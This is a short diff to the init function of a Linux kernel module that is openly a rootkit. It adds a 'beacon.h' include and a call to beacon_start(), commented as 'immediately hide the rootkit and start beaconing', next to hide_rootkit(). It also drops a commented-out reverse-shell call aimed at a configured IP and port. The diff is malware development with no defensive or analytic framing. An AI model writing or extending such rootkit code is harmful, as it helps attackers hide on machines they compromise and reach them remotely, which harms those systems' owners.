@@ -13,6 +13,7 @@
 #include "include/utils.h"
 #include "include/config.h"
 #include "include/netfilter_manager.h"
+#include "include/beacon.h"
 
 #if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
 #define VERSION_NOT_SUPPORTED
@@ -44,8 +45,9 @@ static int __init mod_init(void){
         return err;
     }
     printk(KERN_DEBUG "Successfully loaded\n");
+    // immediately hide the rootkit and start beaconing
     hide_rootkit();
-    //start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+    beacon_start();
     return 0;
 }
 
